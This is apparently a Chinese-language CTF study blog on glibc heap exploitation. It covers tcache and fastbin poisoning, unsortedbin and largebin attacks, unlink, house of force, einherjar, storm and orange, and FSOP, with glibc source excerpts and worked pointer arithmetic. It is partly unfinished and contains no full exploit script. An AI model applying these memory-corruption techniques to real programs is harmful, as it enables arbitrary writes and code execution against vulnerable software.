+<p><img src="/pwn-notes/images/notes/image-20260808145601427.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260808145601427"></p>
+<p><img src="/pwn-notes/images/notes/image-20260808145634238.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260808145634238"></p>
+<p>之前的堆块被分配给了a，然后a和p都指向这块内存，</p>
+<p>然后又申请了一次，</p>
+<p><img src="/pwn-notes/images/notes/image-20260808151941812.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260808151941812"></p>
+<p>还没懂这有什么用，只知道可以修改tcache&#x2F;fd指针。</p>
+<p><img src="/pwn-notes/images/notes/image-20260808152522384.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260808152522384"></p>
+<p>也就是修改的是申请堆块的前16字节。</p>
+<p>entries 是 tcache 登记本上的”链表头指针</p>
+<p>或许就是一开始修改成了目标地址，之后第二次malloc的时候就会得到这个指针，这个指针可能是got表，或者其它的，这个时候我们就可以去修改里面的内容，修改为system函数地址之类的。</p>
+<h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>看的这道题居然不是有关uaf的而是doublefree的。那就来看看</p>
+<p>我刚才浅浅的看了一眼，就是释放两次内存块，之后就开始循环了，接着修改其fd,之后再次申请，既可以得到目标地址。</p>
+<p><img src="/pwn-notes/images/notes/image-20260808155100040.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260808155100040"></p>
+<p>这个写的挺好</p>
+<h2 id="GLIBC2-23"><a href="#GLIBC2-23" class="headerlink" title="GLIBC2.23"></a>GLIBC2.23</h2><p><img src="/pwn-notes/images/notes/image-20260907152500907.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260907152500907"></p>
+<h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack:"></a>fastbin attack:</h3><p>来来来，先瞅瞅这都是啥。</p>
+<p>首先是chunk结构</p>
+<p><img src="/pwn-notes/images/notes/image-20260907155212679.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260907155212679"></p>
+<p><img src="/pwn-notes/images/notes/image-20260911162106494.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260911162106494"></p>
+<p>然后就是根据fastbin特性，然后就是释放堆块使之进入fastbin之后修改指针，编辑其中的指针指向后门函数什么的</p>
+<p>，所以前提条件就是存在uaf等，能够修改指针。</p>
+<p><img src="/pwn-notes/images/notes/image-20260908181557774.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260908181557774"></p>
+<p>之后再次获取两次相同大小的chunk就可以。</p>
+<p>unsoortedbin attack</p>
+<p>介绍一下unsoetedbin:</p>
+<p>┌──────────────────────────────────────────────────┐
+│  Unsorted Bin &#x3D; 释放后暂时存放的”中转站”          │
+│                                                  │
+│  特点:                                           │
+│  1. 所有 size &gt; 0x80 的 chunk 释放后先进这里      │
+│  2. 下次 malloc 时会遍历，按大小分到 small&#x2F;large  │
+│  3. 双向链表 (有 fd 和 bk)                        │
+│  4. FIFO 顺序                                    │
+│  5. 只有一个链表，不按大小分                       │
+└──────────────────────────────────────────────────┘</p>
+<p>与fastbin对比：</p>
+<p><img src="/pwn-notes/images/notes/image-20260908182137790.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260908182137790"></p>
+<h3 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h3><p><img src="/pwn-notes/images/notes/image-20260908182957715.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260908182957715"></p>
+<p><img src="/pwn-notes/images/notes/image-20260908183609761.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260908183609761"></p>
+<p>也就是释放一个大小满足unsortedbin的堆块，之后利用相关的漏洞之后就可以修改指针，然后就可以取出来接着就能够去获取后门函数，或者是泄露fd指针，因为指向的是main_area和libc有关，这样就可以泄露libc。</p>
+<p>fastbin和unsortedbin释放后区别;</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs nix">使用中:                           free 后:<br>┌──────────────────┐              ┌──────────────────┐<br>│  prev_size       │              │  prev_size       │<br>│  size <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x41     │              │  size <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x41     │<br>│  <span class="hljs-params">data0:</span> AAAA     │              │  fd <span class="hljs-operator">=</span> next_chunk │  ← 只覆盖前 <span class="hljs-number">8</span> 字节！<br>│  <span class="hljs-params">data1:</span> BBBB     │              │  <span class="hljs-params">data1:</span> BBBB     │  ← 不变！<br>│  <span class="hljs-params">data2:</span> CCCC     │              │  <span class="hljs-params">data2:</span> CCCC     │  ← 不变！<br>└──────────────────┘              └──────────────────┘<br><br>Fastbin 是单链表，只需要 fd (<span class="hljs-number">8</span>字节)<br>→ 只覆盖数据区前 <span class="hljs-number">8</span> 字节<br>→ data1 之后不变<br><br>使用中:                           free 后:<br>┌──────────────────┐              ┌──────────────────┐<br>│  prev_size       │              │  prev_size       │<br>│  size <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x111    │              │  size <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x111    │<br>│  <span class="hljs-params">data0:</span> AAAA     │              │  fd <span class="hljs-operator">=</span> arena<span class="hljs-operator">+</span><span class="hljs-number">0</span>x68 │  ← 覆盖前 <span class="hljs-number">8</span> 字节<br>│  <span class="hljs-params">data1:</span> BBBB     │              │  bk <span class="hljs-operator">=</span> arena<span class="hljs-operator">+</span><span class="hljs-number">0</span>x68 │  ← 覆盖后 <span class="hljs-number">8</span> 字节<br>│  <span class="hljs-params">data2:</span> CCCC     │              │  <span class="hljs-params">data2:</span> CCCC     │  ← 不变！<br>└──────────────────┘              └──────────────────┘<br><br>Unsorted Bin 是双向链表，需要 fd <span class="hljs-operator">+</span> bk (<span class="hljs-number">16</span>字节)<br>→ 覆盖数据区前 <span class="hljs-number">16</span> 字节<br>→ data2 之后不变<br></code></pre></td></tr></table></figure>
+
+<p><img src="/pwn-notes/images/notes/image-20260921192820322.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260921192820322"></p>
+<p>恢复之后</p>
+<p><img src="/pwn-notes/images/notes/image-20260921192908954.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260921192908954"></p>
+<p>就是尾部删除，头部插入</p>
+<p><img src="/pwn-notes/images/notes/image-20260921192956179.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260921192956179"></p>
+<h4 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h4><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs dns">已知: *<span class="hljs-punctuation">(</span>&amp;arr[<span class="hljs-number">0</span>]<span class="hljs-punctuation">)</span> = P    <span class="hljs-punctuation">(</span>arr[<span class="hljs-number">0</span>] 处存着 P 的地址<span class="hljs-punctuation">)</span><br><br>我们要让:<br>*<span class="hljs-punctuation">(</span>FD + <span class="hljs-number">0</span>x18<span class="hljs-punctuation">)</span> == P    → FD + <span class="hljs-number">0</span>x18 = &amp;arr[<span class="hljs-number">0</span>]    → FD = &amp;arr[<span class="hljs-number">0</span>] - <span class="hljs-number">0</span>x18<br>*<span class="hljs-punctuation">(</span>BK + <span class="hljs-number">0</span>x10<span class="hljs-punctuation">)</span> == P    → BK + <span class="hljs-number">0</span>x10 = &amp;arr[<span class="hljs-number">0</span>]    → BK = &amp;arr[<span class="hljs-number">0</span>] - <span class="hljs-number">0</span>x10<br><br>设:<br>FD = &amp;arr[<span class="hljs-number">0</span>] - <span class="hljs-number">0</span>x18<br>BK = &amp;arr[<span class="hljs-number">0</span>] - <span class="hljs-number">0</span>x10<br><br>验证:<br>*<span class="hljs-punctuation">(</span>FD + <span class="hljs-number">0</span>x18<span class="hljs-punctuation">)</span> = *<span class="hljs-punctuation">(</span>&amp;arr[<span class="hljs-number">0</span>] - <span class="hljs-number">0</span>x18 + <span class="hljs-number">0</span>x18<span class="hljs-punctuation">)</span> = *<span class="hljs-punctuation">(</span>&amp;arr[<span class="hljs-number">0</span>]<span class="hljs-punctuation">)</span> = P ✅<br>*<span class="hljs-punctuation">(</span>BK + <span class="hljs-number">0</span>x10<span class="hljs-punctuation">)</span> = *<span class="hljs-punctuation">(</span>&amp;arr[<span class="hljs-number">0</span>] - <span class="hljs-number">0</span>x10 + <span class="hljs-number">0</span>x10<span class="hljs-punctuation">)</span> = *<span class="hljs-punctuation">(</span>&amp;arr[<span class="hljs-number">0</span>]<span class="hljs-punctuation">)</span> = P ✅<br><br>检查通过！<br></code></pre></td></tr></table></figure>
+
+<p>检查通过之后，执行写入。</p>
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs inform7">FD = &amp;arr<span class="hljs-comment">[0]</span> - 0x18<br>BK = &amp;arr<span class="hljs-comment">[0]</span> - 0x10<br><br>写入 1: FD-&gt;bk = BK<br>即: *(FD + 0x18) = BK<br>即: *(&amp;arr<span class="hljs-comment">[0]</span>) = &amp;arr<span class="hljs-comment">[0]</span> - 0x10<br>即: arr<span class="hljs-comment">[0]</span> = &amp;arr<span class="hljs-comment">[0]</span> - 0x10    ← ⭐ arr<span class="hljs-comment">[0]</span> 变了！<br><br>写入 2: BK-&gt;fd = FD<br>即: *(BK + 0x10) = FD<br>即: *(&amp;arr<span class="hljs-comment">[0]</span>) = &amp;arr<span class="hljs-comment">[0]</span> - 0x18<br>即: arr<span class="hljs-comment">[0]</span> = &amp;arr<span class="hljs-comment">[0]</span> - 0x18    ← ⭐ 又写了一次！<br></code></pre></td></tr></table></figure>
+
+<p>所以使得arr[0]存储的值发生了变化</p>
+<p>largebin attack </p>
+<p>与普通释放的的chunk的区别，就是还多加了两个指针，虽然现在还不知道能干啥。</p>
+<p>首先就是大小不同，大小是大于0x400。</p>
+<p><img src="/pwn-notes/images/notes/image-20260909182716534.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260909182716534"></p>
+<h3 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h3><p><img src="/pwn-notes/images/notes/image-20260925090501719.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260925090501719"></p>
+<p><img src="/pwn-notes/images/notes/image-20260925093423176.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260925093423176"></p>
+<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-262424-1.htm">原创]Largebin attack总结-二进制漏洞-看雪安全社区｜专业技术交流与安全研究论坛</a></p>
+<p>好好看（简略看过，还需细看）</p>
+<h4 id="第二次："><a href="#第二次：" class="headerlink" title="第二次："></a>第二次：</h4><p>largebin 插入过程</p>
+<p><img src="/pwn-notes/images/notes/image-20261020152423105.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020152423105"></p>
+<p>取出过程：</p>
+<p><img src="/pwn-notes/images/notes/image-20261020152721386.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020152721386"></p>
+<p>这个看懂了，就是修改其largebin中的堆块的bk_nextsize（因为取出的时候是按照bk_nextsize来取得）,指向那个我们需要的地址，因为那个堆还未释放，所以我们可以修改其相应的值，绕过相应的检查，但是（什么是和smallbin一样unlink机制是啥，现在不太清楚）</p>
+<p><img src="/pwn-notes/images/notes/image-20261020153643944.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020153643944"></p>
+<p>查看largebin运行原理：</p>
+<p><img src="/pwn-notes/images/notes/image-20261020183317059.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020183317059"></p>
+<p>申请三个堆块，</p>
+<p><img src="/pwn-notes/images/notes/image-20261020183419817.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020183419817"></p>
+<p><img src="/pwn-notes/images/notes/image-20261020184520380.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020184520380"></p>
+<p>释放此时第一个堆块进入unsortedbin<img src="/pwn-notes/images/notes/image-20261020184644479.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020184644479"></p>
+<p>加上隔离块之后：</p>
+<p><img src="/pwn-notes/images/notes/image-20261020185648382.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020185648382"></p>
+<p>就算一开始被释放也是会先进入unsortedbin.</p>
+<p><img src="/pwn-notes/images/notes/image-20261020185905641.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020185905641"></p>
+<p>接下来会进行整理，就会进入largebin</p>
+<p><img src="/pwn-notes/images/notes/image-20261020190233294.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020190233294"></p>
+<p>又申请一个</p>
+<p><img src="/pwn-notes/images/notes/image-20261020190439781.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020190439781"></p>
+<p>这都是啥啊，看不懂。</p>
+<p>直接deepseek再次</p>
+<p><img src="/pwn-notes/images/notes/image-20261020200402906.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020200402906"></p>
+<p><img src="/pwn-notes/images/notes/image-20261020200455373.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020200455373"></p>
+<p><img src="/pwn-notes/images/notes/image-20261020200531329.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020200531329"></p>
+<p>我去，这个看着正常多了</p>
+<p><img src="/pwn-notes/images/notes/image-20261020200637985.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020200637985"></p>
+<p>依旧仍然释放四个堆块</p>
+<p><img src="/pwn-notes/images/notes/image-20261020200752525.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020200752525"></p>
+<p>还是依旧进入unsortedbin</p>
+<p><img src="/pwn-notes/images/notes/image-20261020201142612.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020201142612"></p>
+<p>因为申请的是0x20大小的，所以第一个0x400大小的就会被分割，分了0x20之后就又会被放在unsoretdbin，之后那些大的就会被放进largebin</p>
+<p><img src="/pwn-notes/images/notes/image-20261020202018078.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020202018078"></p>
+<p>确实也是双向链表结构啊，</p>
+<p>接下来取了一个大小是0x3f0也就是0x400大小的，这里是直接将0x604420给取走了</p>
+<p>，同时这里unsortedbin里面这时还是会进行整理，就是会被放入smallbin</p>
+<p><img src="/pwn-notes/images/notes/image-20261020202518484.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020202518484"></p>
+<p><img src="/pwn-notes/images/notes/image-20261020202451029.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020202451029"></p>
+<p><img src="/pwn-notes/images/notes/image-20261020203353418.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020203353418"></p>
+<p>接下来又申请一个0x400就是0x410,正好是850又会被取走</p>
+<p><img src="/pwn-notes/images/notes/image-20261020202910060.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020202910060"></p>
+<p><img src="/pwn-notes/images/notes/image-20261020202924513.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020202924513"></p>
+<p>接下来请求的是0x400但是此时链表中就只是剩下了0x420大小的，会被分割</p>
+<p><img src="/pwn-notes/images/notes/image-20261020204038141.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020204038141"></p>
+<p><img src="/pwn-notes/images/notes/image-20261020204120994.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020204120994"></p>
+<p><img src="/pwn-notes/images/notes/image-20261020210220092.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261020210220092"></p>
+<p>大小是0x31</p>
+<p>之后应该还是会被分到smallbin，感觉smallbin就只是存放那些先在unsortedbin中之后被切割的。</p>
+<h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of  force"></a>house of  force</h3><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>通过堆溢出 &#x2F; UAF 篡改 top chunk 的 <code>size</code> 字段为极大值，欺骗分配器认为堆顶有近乎无限的空闲空间；先申请一块计算好大小的内存，把 top 指针精准移动到<strong>目标地址往前 0x10</strong> 的位置，下一次申请内存时，malloc 就会从目标地址处分配并返回，最终实现让 malloc 返回任意指定的可写内存地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">victim = av-&gt;top;<span class="hljs-comment">//获取当前top chunk的地址</span><br>size = chunksize (victim);<span class="hljs-comment">//计算top chunk的大小</span><br><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br><span class="hljs-comment">//MINSIZE就是堆块的最小size，32位程序为0x10，64位程序为0x20</span><br><span class="hljs-comment">//如果top chunk的大小大于nb(程序执行malloc需要分配的内存大小)</span><br><span class="hljs-comment">//加上MINSIZE的大小，就从top chunk中来切一块内存</span><br><span class="hljs-comment">//之所以要加上MINSIZE是要保证切割后剩余的内存要是一个完整的堆块</span><br>  &#123;<br>    remainder_size = size - nb;<span class="hljs-comment">//remainder_size为切割后的剩余大小</span><br>    remainder = chunk_at_offset (victim, nb);<span class="hljs-comment">//remainder为切割前top chunk+nb的值，也就是切割后top chunk的地址</span><br>    av-&gt;top = remainder;<span class="hljs-comment">//更新top chunk</span><br>    <span class="hljs-comment">//下面两个set_head给切割出去的堆块以及切割后的top chunk设置新的size</span><br>    set_head (victim, nb | PREV_INUSE |<br>              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_head (remainder, remainder_size | PREV_INUSE);<br><br>    check_malloced_chunk (av, victim, nb);<span class="hljs-comment">//调试用的，这里没用</span><br>    <span class="hljs-type">void</span> *p = chunk2mem (victim);<span class="hljs-comment">//返回用户指针</span><br>    alloc_perturb (p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>  &#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>remainder_size &#x3D; size - nb</p>
+<p>remainder &#x3D; chunk_at_offset (victim, nb)</p>
+<p><img src="/pwn-notes/images/notes/image-20261023174746497.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261023174746497"></p>
+<p><img src="/pwn-notes/images/notes/image-20261023175148105.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261023175148105"></p>
+<p>此时在已经知道nb的情况下，再次根据相关机制那么就可以得到相关的remainder地址</p>
+<p><img src="/pwn-notes/images/notes/image-20261023175647625.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261023175647625"></p>
+<figure class="highlight freedesktop"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs freedesktop"><span class="hljs-attr">request_size</span><span class="hljs-operator">=</span>target_addr-0x20-victim<br></code></pre></td></tr></table></figure>
+
+<p>也就是说只需要request_size&#x3D;targeet_addr-0x20-top_chunk</p>
+<p>同时还需要满足条件，通过size检查，修改top_chunk的size位为-1,转化成无符号数就会变成极大的数值</p>
+<h3 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h3><p>利用 off-by-one（1 字节溢出），把后面 chunk 的 PREV_INUSE 置 0，并且伪造 prev_size。free 的时候，glibc 会错误向前合并，跳过中间正在使用的 chunk，把很远的一个空闲 chunk 和当前 chunk 合并在一起，最终造出 chunk overlap（堆重叠）。</p>
+<p><img src="/pwn-notes/images/notes/image-20260925165434749.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260925165434749"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">1. 填满 B 的数据区，溢出写 C 的 `prev_size`，改成 `0x200`（A.size+B.size = 0x100+0x100）<br>2. 溢出再写 1 字节，把 C.size 的最低位从 1 → 0，C.size 变成 `0x100`<br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash"></span><br><span class="language-bash">&gt; 现在 glibc 看到 C：PREV_INUSE=0，认为**前面有一个空闲 chunk**，空闲 chunk 大小是 prev_size=0x200</span><br>3. `free(C)`<br>   - glibc：前一个 chunk 空闲，向前合并！<br>   - 计算前 chunk 地址：`C_addr - prev_size = 0x602200 - 0x200 = 0x602000` → 正好是 Chunk A！<br>   - unlink Chunk A，合并 A + C，中间的 B 被包进大空闲块里面。<br>4. 结果：<br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash"></span><br><span class="language-bash">&gt; Chunk B 的指针仍然可用读写，但 B 所在内存已经属于空闲 unsorted bin 块。**堆重叠达成！**</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="house-of-lore-需补充"><a href="#house-of-lore-需补充" class="headerlink" title="house of lore(需补充)"></a>house of lore(需补充)</h3><h3 id="house-of-storm"><a href="#house-of-storm" class="headerlink" title="house of storm"></a>house of storm</h3><p>关注两个地方：unsorted bin和large bin</p>
+<p>豆包一开始讲的啥啊</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12119">House Of Storm-先知社区</a></p>
+<p>第二次：</p>
+<p>MINSIZE:</p>
+<p>当你调用 <code>malloc(1)</code> 或 <code>malloc(0x10)</code> 这类小请求时，glibc 实际返回给你的 chunk 大小就是 <code>MINSIZE</code>（32 字节）。其中，一部分空间用于存储 chunk 的元数据（如 <code>size</code> 字段），剩下的才是用户数据区。</p>
+<p><code>MINSIZE</code> 在分配逻辑中也是一个重要的判断阈值。例如，当从一个大空闲块（如 top chunk）中分割出所需内存后，**剩余的部分必须不小于 <code>MINSIZE</code>**，才有保留为一个独立空闲块的价值，否则整个大块都会被直接分配出去。</p>
+<p>malloc_consolidate:</p>
+<ol>
+<li><strong><code>free()</code> 时达到阈值</strong>：这是最常见的触发方式。当一个被释放的 chunk 大小超过 <code>FASTBIN_CONSOLIDATION_THRESHOLD</code>（默认 <strong>64KB</strong>）时，为了避免 fastbin 过度膨胀，<code>free</code> 会调用 <code>malloc_consolidate</code> 来清理所有的 fastbin。</li>
+<li><strong><code>malloc()</code> 处理大请求前</strong>：当程序请求一个<strong>大块内存</strong>（<code>large request</code>）时，<code>malloc</code> 可能会先调用 <code>malloc_consolidate</code>，期望通过合并 fastbin 中的碎片，能凑出一个满足大请求的空闲块，从而避免向系统申请新的内存（<code>sbrk</code> 或 <code>mmap</code>）。</li>
+<li><strong>分配器初始化时</strong>：<code>malloc_consolidate</code> 有时也负责在首次调用 <code>malloc</code> 时完成分配器的初始化工作。</li>
+</ol>
+<p><code>__builtin_expect(EXP, N)</code>，意思是<strong>“我期望表达式 <code>EXP</code> 的值等于 <code>N</code></strong></p>
+<p><code>av-&gt;system_mem</code> 是这个 arena <strong>从系统（<code>sbrk</code>&#x2F;<code>mmap</code>）申请到的总堆内存量</strong>，记录在 <code>malloc_state</code> 里</p>
+<p><code>av-&gt;last_remainder</code> 是 arena（<code>malloc_state</code>）里的指针，记录【上一次分割 small 块之后剩下的那个 unsorted bin chunk】</p>
+<p><img src="/pwn-notes/images/notes/image-20261021202354789.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261021202354789"></p>
+<p><img src="/pwn-notes/images/notes/image-20261021202719014.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261021202719014"></p>
+<p>request2size:</p>
+<p>它是 glibc 里的宏，把你传给 malloc 的「用户想要的字节数 (req)」，换算成 ptmalloc 内部用的 chunk 总大小（nb）</p>
+<p><img src="/pwn-notes/images/notes/image-20261021203152520.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261021203152520"></p>
+<p><img src="/pwn-notes/images/notes/image-20261021203327613.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261021203327613"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">chunk_at_offset</span><span class="hljs-params">(victim, nb)</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/pwn-notes/images/notes/image-20261021203730662.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261021203730662"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_head(p, s)   ((p)-&gt;size = (s))</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/pwn-notes/images/notes/image-20261021205800532.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261021205800532"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/pwn-notes/images/notes/image-20261021210422251.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261021210422251"></p>
+<p>所以说就是这个漏洞发生在chunk从unsortedbin进入largebin的时候</p>
+<p>那代码实在有点绕，关键是长。所以简明要点</p>
+<h3 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h3><p>目前就是先修改top chunk的相关参数之后经过unsortedbin attack 然后是</p>
+<p>向指定的内存空间写入（）</p>
+<p>fsop还没看</p>
+<p>overflow函数调用：参数是结构体第一个的首地址，也就是第一个参数</p>
+<p>int (*__overflow)(FILE *fp, int ch);</p>
+<p><img src="/pwn-notes/images/notes/image-20260928164112360.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260928164112360"></p>
+<p>简单总结：</p>
+<p>题目中没有free，但是存在堆溢出，这个时候我们可以利用相关的malloc机制来控制相关的堆块进入我们想让他们进入的bin中。</p>
+<p>首先是topchunk进入unsortedbin，为什么需要topchunk?</p>
+<p><img src="/pwn-notes/images/notes/image-20260928171607588.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260928171607588"></p>
+<p>修改条件：</p>
+<p><img src="/pwn-notes/images/notes/image-20260928171912261.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260928171912261"></p>
+<p><img src="/pwn-notes/images/notes/image-20260928173414990.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260928173414990"></p>
+<p>没看懂这段payload</p>
+<p>反正就只是知道这段改的是相应的old_top_chunk的相关字节</p>
+<p>之后这个topchunk就进入unsoretdbin中了，（当然看wp时候看到还是需要泄露堆地址和libc地址，这时就需要largebinattack了，largebin的size字段泄露对地址，而unsortedbin中的fd和bk字段泄露的即是mian_area也就是libc地址）</p>
+<p>接下来就是unsoretdbinattack 就是修改unsorted bin 的bk指针为io_list_all地址，接下来io_list_all里面就会被写入main_area+88的地址</p>
+<p><img src="/pwn-notes/images/notes/image-20260928174518533.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260928174518533"></p>
+<p>当然这里写入的因该是io_list_all-0x10;</p>
+<p>所以下一次再申请堆块的时候，io_list_all就会被写入main_area+88</p>
+<p>而我们需要改动的是其结构体里面的chain(main_area+168)这个chain其实决定了下一个io_list_all结构体的地址，让这个地址又是smallbin中size为0x60的数组，所以我们就可以再来一个smallbin来更改结构体里面的内容。</p>
+<p><img src="/pwn-notes/images/notes/image-20260928174936848.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260928174936848"></p>
+<p>需要根据绕过的检查来更改内容：</p>
+<p>io_over_flow的触发条件：</p>
+<p><img src="/pwn-notes/images/notes/image-20260928175511630.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260928175511630"></p>
+<p>mode&#x3D;0,_IO_write_ptr&#x3D;1,_IO_write_base&#x3D;0</p>
